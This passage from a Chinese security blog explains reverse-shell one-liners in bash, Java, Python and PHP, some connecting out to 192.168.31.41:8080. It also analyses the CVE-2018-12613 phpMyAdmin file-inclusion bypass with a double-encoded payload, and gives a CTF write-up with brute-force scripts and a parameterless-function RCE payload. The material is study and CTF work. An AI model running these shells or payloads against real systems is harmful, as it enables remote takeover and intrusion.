<li>这里相当于 <code>bash -i 1&gt; /dev/tcp/ip/port 2&gt;&amp;1</code> 先将文件描述符 1 重定向到 <code>/dev/tcp/ip/port</code> ，然后再将文件描述符 2 重定向到 <code>/dev/tcp/ip/port</code></li>
<li><code>0&gt;&amp;1</code> 将文件描述符 0 重定向到 <code>/dev/tcp/ip/port</code></li>
<li>最终所有的标准输入输出都在这个文件中，很明显完成了反弹 shell</li>
</ul>
</li>
<li><code>bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5</code><ul>
<li><code>5&lt;&gt;/dev/tcp/host/port</code> 以读写方式打开 <code>/dev/tcp/host/port</code>，并将文件描述符重定向到 <code>/dev/tcp/host/port</code></li>
<li><code>0&gt;&amp;5</code> 文件描述符 0 重定向到 5</li>
<li><code>1&gt;&amp;5</code> 文件描述符 1 重定向到 5</li>
<li>最终文件描述符 0 和 1都重定向到 <code>/dev/tcp/host/port</code> 完成 反弹 shell</li>
</ul>
</li>
<li><code>exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line &gt;&amp;5; done</code><ul>
<li><code>exec 5&lt;&gt;/dev/tcp/host/port</code> 以读写方式打开 <code>/dev/tcp/host/port</code>，并将文件描述符重定向到 <code>/dev/tcp/host/port</code></li>
<li><code>cat &lt;&amp;5</code> 将文件描述符 5 重定向到 cat 中，即 cat 读取 &amp;5 的内容，也即 cat 读取 <code>/dev/tcp/host/port</code> 中的内容</li>
<li><code>|</code> 将 cat 读取的结果作为后面的输入</li>
<li><code>while read line; do $line &gt;&amp;5; done</code> 循环读取 <code>cat &lt;&amp;5</code> 中的内容，赋值给 line，然后 $line 执行 line，最后 &gt;&amp;5 表示将 bash 的输出和错误重定向到文件描述符 5 中，即 <code>/dev/tcp/host/port</code> 中</li>
</ul>
</li>
</ul>
<h1 id="Java-反弹-shell"><a href="#Java-反弹-shell" class="headerlink" title="Java 反弹 shell"></a>Java 反弹 shell</h1><ul>
<li><p>基本方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;).waitFor();</span><br></pre></td></tr></table></figure>
</li>
<li><p>或者</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;).waitFor();</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>/bin/bash</code> 是需要运行的程序，<code>-c</code> 和 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code> 都是作为 <code>/bin/bash</code> 的参数。<code>bash -c &quot;cmd string&quot;</code> 意为 shell 运行 <code>cmd string</code>，所以上述代码就是利用 shell 运行 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
</li>
</ul>
<h1 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.31.41"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<h1 id="PHP-反弹-shell"><a href="#PHP-反弹-shell" class="headerlink" title="PHP 反弹 shell"></a>PHP 反弹 shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(<span class="string">"192.168.31.41"</span>,<span class="number">8080</span>);</span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/28/CVE-2018-12613 复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/28/CVE-2018-12613 复现/" itemprop="url">CVE-2018-12613 的一些思考</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-28T19:12:33+08:00">
                2019-06-28
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>/index.php 第 55 行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入参数 target 需要满足</p>
<ol>
<li>不以 index.php 开头</li>
<li>不在 target_blacklist 中</li>
<li>通过 checkPageValidity() 函数检验</li>
</ol>
<p>checkPageValidity() 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第一个返回 True 的地方，直接将 page 与 whitelist 比较，传入的必须是白名单里的文件名，无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个返回 True 的地方，mb_strpos($x, $y) 函数查找 $y 在 $x 中首次出现的位置。mb_substr($str, $start, $length) 函数从 $str 中，截取从 $start 位置开始，长度为 $length 的字符串。</p>
<p>但是在这里如果直接构造 payload : <code>?target=db_sql.php?/../../../cookie.txt</code> 并不能跨路径包含，? 后面的字符串会被当做传入 db_sql.php 的参数，这就要利用后面的 urldecode 了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三个返回 True 的地方，可以利用双重编码绕过，将 ? 经过两次编码 %253f 就可以绕过白名单验证。%253f 传入时，首先会被自动解码一次，变成 %3f，然后urldecode() 再解码一次，就变成了 ?</p>
<p>此时的 payload : <code>?target=db_sql.php%253f/../../../cookie.txt</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">         $_page,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">      );</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
<li><p><code>include &#39;db_sql.php%253f/../../../cookie.txt&#39;</code> 为什么只会包含 cookie.txt 而不会包含 db_sql.php</p>
</li>
<li><p>传入 <code>db_sql.php%253f/../../../cookie.txt</code> 为什么会在 <code>in_array($_page, $whitelist)</code> 处返回 True</p>
</li>
<li><p>如图，z.php 中 include 两个 ../ 可以包含，y.php 中一个 include 也可以包含</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/ques/ques_1.png" alt></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/ques/ques_2.png" alt></p>
</li>
<li><p>在 php 的 include 中，<code>include &#39;hint.php?/../cookie.txt&#39;;</code> 会报错，<code>include &#39;hint.php%3f/../cookie.txt&#39;;</code> 不会报错，且可以成功包含</p>
</li>
</ol>
<h1 id="一些解释"><a href="#一些解释" class="headerlink" title="一些解释"></a>一些解释</h1><p>在 include 中，举个例子，假设 <code>x.php</code> 代码包含 <code>include &#39;1source.phps/../cookie.txt&#39;;</code> ，假设 <code>1source.phps</code> 不存在，那么这个文件包含等同于 : 在 <code>1source.phps</code> 文件夹目录下的上一级中的 <code>cookie.txt</code> ，也就是和 <code>x.php</code> 在同一目录下的 <code>cookie.txt</code> ，如果 <code>1source.phps</code> 存在，并且它是一个文件，那么肯定会报错，如果它是一个文件夹，也会成功包含 <code>cookie.txt</code> 。如果变为 <code>include &#39;1source.phps/./cookie.txt&#39;;</code> ，道理和上面相同</p>
<h1 id="重新思考"><a href="#重新思考" class="headerlink" title="重新思考"></a>重新思考</h1><ul>
<li><p>代码如下 : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>传入 <code>file=hint.php</code> ，在第一个 <code>in_array</code> 处会返回 true，然后直接包含 <code>hint.php</code></li>
<li>传入 <code>file=hint.php?/../cookie.txt</code> ，在第二个 <code>in_array</code> 处会返回 true，第二个 <code>in_array</code> 中的 <code>_page</code> 为 <code>hint.php</code> ，然后包含 <code>hint.php?/../cookie.txt</code> ，但是这里的 <code>?</code> 起到传递参数的作用而不是破坏路径</li>
<li>传入 <code>file=hint.php%253f/../cookie.txt</code> ，在第三个 <code>in_array</code> 处会返回 true ，第三个 <code>in_array</code> 中的 <code>_page</code> 为 <code>hint.php</code> ，然后包含 <code>hint.php%3f/../cookie.txt</code> ，这里的 <code>%3f</code> 即 <code>?</code> ，破坏了路径，前面部分的路径不存在，可以包含后面的文件</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/2019CISCN华南线下部分web复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/2019CISCN华南线下部分web复现/" itemprop="url">2019CISCN华南线下两道web复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T22:43:09+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
                    <span itemprop="name">CTF wp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>原帖地址 : <a href="https://xz.aliyun.com/t/5558" target="_blank" rel="noopener">https://xz.aliyun.com/t/5558</a></p>
<p>部分题目下载地址，有的不完整 : <a href="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip" target="_blank" rel="noopener">点我点我</a></p>
<h1 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h1><ul>
<li><p>考点 : 无参函数的 RCE</p>
</li>
<li><p>在注释中发现了 forgetpassword.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png" alt></p>
</li>
<li><p>打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 <code>admin123</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/ciscn/web1/useri.php"</span></span><br><span class="line"></span><br><span class="line">response = <span class="string">"没有这个用户"</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./username.txt"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	line = line.strip()</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"user_name"</span> : line,</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(line)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输入 admin123 之后跳转到 useryzm.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png" alt></p>
</li>
<li><p>提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 <code>MTQyMw==</code></p>
<p>四位数字生成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">	s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">	print(s)</span><br><span class="line">	f = open(<span class="string">"num.txt"</span>,<span class="string">'a'</span>)</span><br><span class="line">	f.write(s)</span><br><span class="line">	f.write(<span class="string">'\n'</span>)   <span class="comment">#实现换行的功能</span></span><br></pre></td></tr></table></figure>

<p>爆破密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/ciscn/web1/yzmi.php'</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./num.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">response = <span class="string">"错误"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	line = line.strip().encode(<span class="string">'utf-8'</span>)</span><br><span class="line">	line = base64.b64encode(line)</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"yzm"</span> : line.decode(<span class="string">'utf-8'</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(line)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>输入后获得密码 <code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png" alt></p>
</li>
<li><p>返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png" alt></p>
</li>
<li><p>mDjNaF.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png" alt></p>
</li>
<li><p>看一下正则，<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>phpinfo();</code> 可以查看 phpinfo 页面</p>
</li>
<li><p>接下来就是构造无参数函数进行 RCE 了，想到可以<strong>更改 header 中的属性和值</strong>，使用无参数函数获取 header 处的值，达到 RCE 的目的。</p>
</li>
<li><p>对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。</p>
</li>
<li><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"><span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png" alt></p>
</li>
<li><p>还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE</p>
</li>
<li><p>payload : <code>?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;))</code></p>
